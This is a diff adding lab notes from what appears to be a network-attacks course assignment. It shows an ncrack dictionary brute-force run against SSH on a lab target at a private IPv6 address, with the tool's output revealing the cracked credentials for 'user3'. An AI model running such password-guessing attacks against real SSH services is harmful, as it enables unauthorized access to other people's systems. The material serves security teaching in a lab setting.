@@ -130,3 +130,22 @@ How to access SSH on Target 4:
  ssh -p 2240 -6 fc00::3:5
 
 
+
+
+ncrack --user user3 -6 -P 3-network_attacks/dict.txt fc00::3:5
+
+
+root@vagrant:~/assignments# ncrack --user user3 -6 -P 3-network_attacks/dict.txt ssh://target4.mooc:2240
+
+
+Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-09-23 13:33 UTC
+Stats: 0:00:28 elapsed; 0 services completed (1 total)
+Rate: 9.81; Found: 0; About 3.35% done; ETC: 13:47 (0:13:29 remaining)
+Stats: 0:01:16 elapsed; 0 services completed (1 total)
+Rate: 6.12; Found: 0; About 12.33% done; ETC: 13:44 (0:09:01 remaining)
+Stats: 0:06:26 elapsed; 0 services completed (1 total)
+Rate: 7.76; Found: 1; About 81.40% done; ETC: 13:41 (0:01:28 remaining)
+(press 'p' to list discovered credentials)
+Discovered credentials for ssh on fc00::3:5 2240/tcp:
+fc00::3:5 2240/tcp ssh: 'user3' 'guitar1'
+
